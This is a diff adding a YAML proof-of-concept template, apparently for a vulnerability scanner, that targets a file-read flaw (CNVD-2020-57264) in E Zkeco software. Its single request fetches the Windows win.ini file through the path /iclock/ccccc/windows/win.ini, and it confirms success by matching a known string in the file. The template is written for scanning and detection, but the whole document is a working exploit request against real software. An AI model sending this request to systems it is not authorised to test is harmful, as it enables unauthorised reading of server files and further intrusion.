@@ -1,0 +1,22 @@
+id: poc-yaml-e-zkeco-cnvd-2020-57264-read-file
+info:
+  name: E Zkeco Read File (CNVD-2020-57264)
+  severity: medium
+  tags:
+  - cnvd-2020-57264
+  - CNVD-2020-57264
+  finger: E Zkeco
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: GET
+  path: /iclock/ccccc/windows/win.ini
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, "for 16-bit app support")
+  output: []
